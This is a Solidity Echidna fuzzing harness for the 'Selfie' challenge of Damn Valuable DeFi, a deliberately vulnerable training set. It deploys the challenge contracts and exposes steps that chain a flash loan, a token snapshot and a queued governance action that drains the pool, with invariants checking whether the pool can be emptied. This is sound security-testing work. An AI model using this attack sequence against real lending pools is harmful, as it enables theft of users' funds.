// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @notice to run echidna use following command:
 * yarn selfie-echidna
 */

// this contract is used to set fuzzing environment (to deploy all necessary contracts)
contract SelfieDeployment {
    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    function deployContracts()
        external
        returns (
            SelfiePool,
            SimpleGovernance,
            DamnValuableTokenSnapshot
        )
    {
        // deploy contracts
        DamnValuableTokenSnapshot token;
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        SimpleGovernance governance;
        governance = new SimpleGovernance(address(token));

        SelfiePool pool;
        pool = new SelfiePool(address(token), address(governance));
        // fund selfie pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        return (pool, governance, token);
    }
}

contract EchidnaSelfie {
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    bool queueActionEnabled;
    bool drainAllFundsEnabled;
    bool transferEnabled;

    uint256 weiAmount;
    uint256 actionId;
    uint256 timestampActionQueued;
    uint256 transferAmount;

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    constructor() payable {
        SelfieDeployment deployer;
        deployer = new SelfieDeployment();
        (pool, governance, token) = deployer.deployContracts();
    }

    function flashLoan() public {
        // borrow max amount of tokens
        uint256 borrowAmount = token.balanceOf(address(pool));
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address, uint256 _amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function."
        );
        // logic
        callbackFunctions();
        // repay the loan
        require(token.transfer(address(pool), _amount), "flash loan failed");
    }

    /**
     * @notice a callback function to be used only during flashloan
     */
    function callbackFunctions() internal {
        if (queueActionEnabled) {
            queueAction();
        }
        if (drainAllFundsEnabled) {
            drainAllFunds();
        }
        if (transferEnabled) {
            transferFrom();
        }
    }

    function queueAction() public {
        // create payload
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        // takeSnaphost as it is needed in queueAction()
        token.snapshot();
        // queue action
        actionId = governance.queueAction(address(pool), payload, 0);
        // set testing variables
        timestampActionQueued = block.timestamp;
    }

    function executeAction() public {
        // it does not make sense to call executeAction if the requirment is not met
        require(
            block.timestamp >= timestampActionQueued + ACTION_DELAY_IN_SECONDS,
            "Time for action execution has not passed yet"
        );
        governance.executeAction(actionId);
    }

    function drainAllFunds() public {
        pool.drainAllFunds(address(this));
    }

    function transferFrom() public {
        uint256 _poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), address(this), _poolBalance);
    }

    /////////////
    // SETTERS //
    /////////////

    function setQueueActionEnabled(bool _enabled) external {
        queueActionEnabled = _enabled;
    }

    function setDrainAllFundsEnabled(bool _enabled) external {
        drainAllFundsEnabled = _enabled;
    }

    function setTransferEnabled(bool _enabled) external {
        transferEnabled = _enabled;
    }

    ////////////////
    // INVARIANTS //
    ////////////////

    // GENERAL: Can we drain SelfiePool?
    function checkPoolBalance() external view {
        assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
    }

    function checkThisContractBalance() external view {
        assert(token.balanceOf(address(this)) == 0);
    }
}
